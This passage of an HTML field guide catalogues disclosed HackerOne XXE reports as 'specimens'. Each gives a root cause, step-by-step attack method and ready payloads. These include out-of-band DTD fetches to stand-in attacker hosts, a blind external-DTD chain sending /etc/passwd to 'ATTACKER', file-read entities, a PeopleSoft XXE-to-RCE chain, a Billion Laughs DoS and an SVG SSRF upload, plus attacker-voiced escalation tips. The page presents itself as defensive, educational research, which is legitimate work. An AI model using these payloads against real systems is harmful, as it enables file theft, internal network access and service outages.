+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1150799" target="_blank" rel="noopener">hackerone.com/reports/1150799</a></span><a class="src" href="#report-1150799" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-106865" style="--sv:var(--sev-high)" data-sev="3" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE via base64 SAMLResponse at the SSO ACS endpoint</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#106865</b> · informatica · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>web</b></span><span>Chain <b>XXE at SSO -&gt; OOB DTD fetch -&gt; file read / SSRF into i</b></span><span>Tag <b>saml</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The SAML assertion consumer parses the base64-decoded SAMLResponse XML with an XXE-vulnerable parser before/without signature enforcement, so a DOCTYPE with a parameter entity triggers outbound requests and file access.</p>
+<h4>Method</h4><ol><li>Craft a SAMLResponse XML that begins with a DOCTYPE declaring a parameter entity pointing at your host</li><li>Base64+URL-encode it and POST as SAMLResponse to the /sso ACS endpoint</li><li>Confirm the server fetches your external DTD (OOB), then escalate to file exfiltration</li></ol>
+<div class="pre">SAMLResponse (before base64):
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % asd SYSTEM "http://evilhost"&gt; %asd;]&gt;
+&lt;samlp:Response ...&gt;...&lt;/samlp:Response&gt;</div>
+<p class="insight"><b>Insight —</b> SAML ACS endpoints are a prime XXE surface: the SP must parse attacker-influenced XML. Prepend a DOCTYPE/parameter-entity to any SAMLResponse and watch for OOB callbacks - often works even with an invalid signature because parsing happens first.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/106865" target="_blank" rel="noopener">hackerone.com/reports/106865</a></span><a class="src" href="#report-106865" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-710654" style="--sv:var(--sev-high)" data-sev="3" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PeopleSoft PSIGW XXE -&gt; SSRF -&gt; Apache Axis service deploy = RCE (CVE-2017-3548)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#710654</b> · deptofdefense · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>XXE -&gt; SSRF to localhost Apache Axis AdminService -&gt; d</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Oracle PeopleSoft's /PSIGW/PeopleSoftServiceListeningConnector parses XML with a DOCTYPE PUBLIC external reference (CVE-2017-3548); the SYSTEM/PUBLIC URL is fetched server-side (SSRF), and pointing it at the localhost Apache Axis /pspc/services/AdminService lets an attacker deploy a new SOAP service -&gt; RCE.</p>
+<h4>Method</h4><ol><li>Send a DOCTYPE with a PUBLIC identifier whose URL targets http://localhost:80/pspc/services/AdminService.</li><li>URL-encode an Axis wsdd deployment that registers a new service (className org.apache.pluto.portalImpl.Deploy, allowedMethods *).</li><li>The connector fetches the URL, deploying the service; confirm at /pspc/services/&lt;name&gt;.</li><li>Use the deployed Axis service to achieve command execution.</li></ol>
+<div class="pre">POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
+Content-Type: application/xml
+
+&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=&lt;url-encoded Axis wsdd deploying service 'h1testservice' with className org.apache.pluto.portalImpl.Deploy and allowedMethods=*&gt;"&gt;
+&lt;a&gt;&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> PeopleSoft PSIGW listening connector is a signature XXE (probe with a simple DOCTYPE PUBLIC that dials your host). Escalate the XXE-driven SSRF to the internal Apache Axis AdminService (localhost /pspc/services/AdminService) to deploy an attacker service = RCE. This is CVE-2017-3548; a bare probe payload (&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"&gt;) confirms parsing before weaponizing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/710654" target="_blank" rel="noopener">hackerone.com/reports/710654</a></span><a class="src" href="#report-710654" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-105980" style="--sv:var(--sev-high)" data-sev="3" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Out-of-band XXE via parameter entity on XML login endpoint</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#105980</b> · owncloud · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>owncloud</b></span><span>Surface <b>web</b></span><span>Chain <b>XXE -&gt; SSRF (server-side HTTP) and local file read</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The /user/login endpoint parses application/xml bodies with external-entity resolution enabled, so a SYSTEM parameter entity forces the server to make an outbound request (and read local files), confirmed via the attacker's access log.</p>
+<h4>Method</h4><ol><li>Send a POST with Content-Type: application/xml carrying a DOCTYPE with a parameter entity pointing at your server.</li><li>Watch your web log for the server-side GET to confirm XXE/SSRF.</li><li>Escalate to file read via php://filter or an external DTD that exfiltrates file contents.</li></ol>
+<div class="pre">POST /user/login HTTP/1.1
+Content-Type: application/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % select SYSTEM "http://COLLAB/ok"&gt;
+%select;
+]&gt;
+&lt;a&gt;wlrm-scnr&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Login/API endpoints that accept application/xml are prime XXE targets; a parameter-entity SYSTEM fetch to a collaborator is the cleanest blind confirmation, then chain an external DTD for file exfiltration and internal SSRF.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/105980" target="_blank" rel="noopener">hackerone.com/reports/105980</a></span><a class="src" href="#report-105980" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-248668" style="--sv:var(--sev-med)" data-sev="2" data-votes="258" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Error-based file read XXE in cloudhopper SXMP servlet</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#248668</b> · x · awarded · 258 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The SXMP (cloudhopper-commons) SMS API parses posted XML with external entities enabled; placing the entity in a field the app coerces to another type (operatorId -&gt; integer) makes the type-conversion error message reflect the entity contents (file read).</p>
+<h4>Method</h4><ol><li>POST XML to /api/sxmp/1.0 with a SYSTEM entity pointing at file:///etc/passwd.</li><li>Reference the entity inside &lt;operatorId&gt;, which the servlet tries to parse as an integer.</li><li>The 'Unable to convert [&lt;file contents&gt;] to an integer' error returns the file inline.</li><li>Swap file:// for http:// to confirm outbound SSRF.</li></ol>
+<div class="pre">POST /api/sxmp/1.0 HTTP/1.1
+Content-Type: text/xml
+
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;operation type="deliver"&gt;
+&lt;account username="abc" password="a"/&gt;
+&lt;deliverRequest referenceId="MYREF102020022"&gt;
+&lt;operatorId&gt;&amp;file;&lt;/operatorId&gt;
+&lt;sourceAddress type="network"&gt;40404&lt;/sourceAddress&gt;
+&lt;destinationAddress type="international"&gt;123&lt;/destinationAddress&gt;
+&lt;text encoding="ISO-8859-1"&gt;a&lt;/text&gt;
+&lt;/deliverRequest&gt;
+&lt;/operation&gt;</div>
+<p class="insight"><b>Insight —</b> Reflect XXE through a validation/conversion error: put the entity in a field the parser casts to int/date, and the error message becomes your exfil channel (no OOB needed). Fingerprint the service to its open-source repo (here github.com/twitter/cloudhopper-commons) to learn the exact XML schema/endpoint.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/248668" target="_blank" rel="noopener">hackerone.com/reports/248668</a></span><a class="src" href="#report-248668" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1095645" style="--sv:var(--sev-med)" data-sev="2" data-votes="41" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>WordPress Media Library XXE on PHP8 via LIBXML_NOENT misuse (.wav upload)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1095645</b> · wordpress · awarded · 41 votes · resolved</div>
+<div class="taxo"><span>Program <b>wordpress</b></span><span>Surface <b>web</b></span><span>Chain <b>wav upload -&gt; XXE -&gt; file read / SSRF / (phar:// -&gt;</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WordPress' ID3/wav parsing calls simplexml_load_string(..., LIBXML_NOENT). On PHP8 the pre-PHP8 guard libxml_disable_entity_loader() is skipped, but LIBXML_NOENT explicitly re-enables entity substitution, so attacker XML inside a .wav triggers XXE.</p>
+<h4>Method</h4><ol><li>Craft a .wav whose embedded XML chunk references an external DTD (edit the URL at the file offset with a hex editor to avoid corrupting the RIFF).</li><li>Host xxe.dtd that base64-reads /etc/passwd and exfiltrates it OOB.</li><li>As an author-or-higher user, upload xxe.wav to the Media Library.</li><li>The target's outbound request delivers the base64 file contents to your server.</li></ol>
+<div class="pre"># vulnerable code:
+$XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
+# .wav contains an XML chunk:
+&lt;!DOCTYPE r [ &lt;!ENTITY % ext SYSTEM "http://attacker/xxe.dtd"&gt; %ext; ]&gt;
+# xxe.dtd: base64 read + OOB exfil of /etc/passwd (phar:// possible for deserialization)</div>
+<p class="insight"><b>Insight —</b> LIBXML_NOENT (misleadingly named) turns ON entity substitution; on PHP8/libxml&gt;=2.9 it re-introduces XXE even though defaults are safe. Audit for LIBXML_NOENT and libxml_disable_entity_loader removals during PHP8 migrations. Media/audio (RIFF/WAV, ID3) files carry XML chunks -&gt; upload-based XXE. phar:// wrapper can chain to deserialization RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1095645" target="_blank" rel="noopener">hackerone.com/reports/1095645</a></span><a class="src" href="#report-1095645" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-55431" style="--sv:var(--sev-med)" data-sev="2" data-votes="35" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE via healthcare C-CDA XML import -&gt; arbitrary file read</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#55431</b> · drchrono · awarded · 35 votes · resolved</div>
+<div class="taxo"><span>Program <b>drchrono</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A 'Update patient (via C-CDA XML)' import parses uploaded XML with external entities enabled, so a crafted C-CDA document reads local files (and can reach internal services) which are rendered back in the preview.</p>
+<h4>Method</h4><ol><li>Download a legitimate C-CDA XML template from the app</li><li>Insert an external-entity DOCTYPE pointing at /etc/passwd</li><li>Upload and click Preview to see the file contents reflected</li></ol>
+<div class="pre">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;ClinicalDocument&gt;...&lt;title&gt;&amp;xxe;&lt;/title&gt;...&lt;/ClinicalDocument&gt;</div>
+<p class="insight"><b>Insight —</b> Domain-specific XML import formats (C-CDA/HL7, SAML, DOCX/XLSX, SVG, sitemap, GPX) are prime XXE sinks that generic scanners miss. Any 'import via XML' feature that echoes parsed values into a preview gives a direct file-read oracle.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/55431" target="_blank" rel="noopener">hackerone.com/reports/55431</a></span><a class="src" href="#report-55431" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-509315" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Billion Laughs entity-expansion DoS in c3p0 XML config loader (CVE-2019-5427)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#509315</b> · central-security-project · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>central-security-project</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">c3p0's C3P0ConfigXmlUtils.extractXmlConfigFromInputStream() parses XML config without disabling DOCTYPE, so a recursively-nested-entity (Billion Laughs) document expands exponentially and crashes the JVM.</p>
+<h4>Method</h4><ol><li>Feed a Billion Laughs XML payload to c3p0's XML config loader (any path where poisoned config XML reaches the component).</li><li>Nested entities (lol1..lol9) expand to billions of nodes, exhausting memory and crashing the JVM.</li></ol>
+<div class="pre">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol "lol"&gt;
+ &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+ &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
+ &lt;!ENTITY lol3 "&amp;lol2;..."&gt; ... &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</div>
+<p class="insight"><b>Insight —</b> XXE isn't only file read/SSRF -- any XML parser that allows DOCTYPE (no external entity resolution required) is vulnerable to Billion Laughs entity-expansion DoS. The universal fix is disabling DOCTYPE (feature http://apache.org/xml/features/disallow-doctype-decl = true), which is the same hardening that kills XXE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/509315" target="_blank" rel="noopener">hackerone.com/reports/509315</a></span><a class="src" href="#report-509315" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-845832" style="--sv:var(--sev-low)" data-sev="1" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SVG avatar upload -&gt; XXE/SSRF and local file fetch via xlink:href</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#845832</b> · lab45 · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>lab45</b></span><span>Surface <b>web</b></span><span>Chain <b>SVG upload -&gt; XXE/SSRF -&gt; internal resource fetch / fi</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An avatar upload accepts image/* including image/svg+xml; SVG is XML, so a crafted SVG with an &lt;image xlink:href&gt; to an external or internal URL causes the server/renderer to fetch attacker-chosen resources (SSRF) and can fetch local files.</p>
+<h4>Method</h4><ol><li>In the avatar upload flow, change the contentType to image/svg+xml (pre-signed S3 flow: change contentType in both the presign request and the PUT).</li><li>Upload an SVG whose &lt;image xlink:href&gt; points at an attacker server (confirm via netcat) or an internal/local path.</li><li>Observe SSRF callback / local resource inclusion when the SVG is processed/rendered.</li></ol>
+<div class="pre">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200"&gt;
+  &lt;image x="10" y="10" width="276" height="110" xlink:href="http://ATTACKER:81/svg"/&gt;
+&lt;/svg&gt;
+&lt;!-- classic XXE variant: &lt;!DOCTYPE svg [&lt;!ENTITY foo SYSTEM "file:///etc/passwd"&gt;]&gt; ...&amp;foo; --&gt;</div>
+<p class="insight"><b>Insight —</b> An image upload that accepts SVG is an XML/XXE and SSRF surface. Bypass MIME checks by setting Content-Type to image/svg+xml (especially in multi-step presigned-URL uploads where the type is echoed). xlink:href fetches remote and local resources; DOCTYPE entities give file read / billion-laughs DoS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/845832" target="_blank" rel="noopener">hackerone.com/reports/845832</a></span><a class="src" href="#report-845832" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-154096" style="--sv:var(--sev-none)" data-sev="0" data-votes="56" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Blind OOB XXE via external DTD parameter-entity exfiltration</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#154096</b> · uber · 500 · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The GeneralSearch API parses attacker-supplied XML (switch GET-&gt;POST with Content-Type: application/xml) resolving external entities; no direct reflection, so a parameter-entity external DTD exfiltrates file contents out-of-band.</p>
+<h4>Method</h4><ol><li>Convert the request to POST with Content-Type: application/xml</li><li>Confirm entity resolution with a SYSTEM entity pointing at your collaborator (ping-back)</li><li>Host a payload.dtd that reads a file into a parameter entity and sends it to your server</li></ol>
+<div class="pre">POST /api/search/GeneralSearch
+Content-type: application/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE roottag [
+ &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+ &lt;!ENTITY % dtd SYSTEM "http://ATTACKER/payload.dtd"&gt;
+ %dtd;]&gt;
+&lt;GeneralSearch&gt;&amp;send;&lt;/GeneralSearch&gt;
+
+# payload.dtd:
+&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://ATTACKER/content?%file;'&gt;"&gt;
+%all;</div>
+<p class="insight"><b>Insight —</b> Any endpoint accepting XML (even ones that normally take GET/JSON) is an XXE candidate - force Content-Type: application/xml, ping-back to confirm, then use external-DTD parameter entities for blind exfil.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/154096" target="_blank" rel="noopener">hackerone.com/reports/154096</a></span><a class="src" href="#report-154096" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (1 of 25 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">XXE labs</a> (hands-on practice).</li>
+<li>All 25 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#where-xml-parsing-hides">Where XML parsing hides</a><a href="#payload-techniques">Payload techniques</a><a href="#in-band-file-read" style="padding-left:24px">↳ In-band file read</a><a href="#blind-out-of-band-exfiltration" style="padding-left:24px">↳ Blind out-of-band exfiltration</a><a href="#ssrf-and-cloud-metadata" style="padding-left:24px">↳ SSRF and cloud metadata</a><a href="#xinclude-fallback" style="padding-left:24px">↳ XInclude fallback</a><a href="#container-format-xxe-file-upload" style="padding-left:24px">↳ Container-format XXE (file upload)</a><a href="#windows-ntlm-hash-theft" style="padding-left:24px">↳ Windows NTLM hash theft</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (25)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ PortSwigger: XXE</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
